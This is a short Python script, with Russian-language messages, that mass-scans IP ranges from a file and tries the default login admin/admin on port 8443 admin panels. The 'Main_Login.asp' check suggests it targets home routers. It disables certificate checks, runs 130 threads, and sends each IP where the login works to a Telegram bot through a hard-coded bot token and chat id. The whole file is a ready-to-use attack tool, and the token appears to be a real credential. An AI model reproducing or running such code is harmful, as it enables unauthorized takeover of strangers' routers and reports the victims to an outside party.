import requests
from concurrent.futures import ThreadPoolExecutor
from ipaddress import ip_network
from urllib3.exceptions import ConnectTimeoutError

TOKEN = '6741660479:AAH91nQ2kIXbsva6NQEMpRNldhfS7vPP8Wc'
chat_id = "1365132609"

def check_login(args):
    ip, username, password = args
    url = f"https://{ip}:8443/login.cgi"
    payload = {
        "login_username": username,
        "login_passwd": password
    }

    session = requests.Session()
    try:
        response = session.post(url, data=payload, verify=False, timeout=5)
        response.raise_for_status()

        success_message = f"IP {ip}: Вход успешен\n"
        error_message = f"IP {ip}: Ошибка входа\n"

        if "Main_Login.asp" not in response.text:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={success_message}"
            print(session.get(url).json())
            print(success_message)
        else:
            print(error_message)

    except requests.exceptions.SSLError as e:
        error_message = f"IP {ip}: Ошибка SSL - {e}\n"
        print(error_message)
    except ConnectTimeoutError as e:
        error_message = f"IP {ip}: Время ожидания подключения истекло - {e}\n"
        print(error_message)
    except requests.RequestException as e:
        error_message = f"IP {ip}: Ошибка запроса - {e}\n"
        print(error_message)
    finally:
        session.close()

def process_ranges(ip_ranges_file, username, password):
    with open(ip_ranges_file, 'r', encoding='utf-8') as f:
        ip_ranges = [line.strip() for line in f]

    with ThreadPoolExecutor(max_workers=130) as executor:
        args = ((str(ip), username, password) for ip_range in ip_ranges for ip in ip_network(ip_range, strict=False).hosts())
        executor.map(check_login, args)

def main():
    username = "admin"
    password = "admin"
    ip_ranges_file = "sorted.txt"  # Замените на имя вашего файла с диапазонами IP
    process_ranges(ip_ranges_file, username, password) # перебор диапазонов

if __name__ == "__main__":
    main()
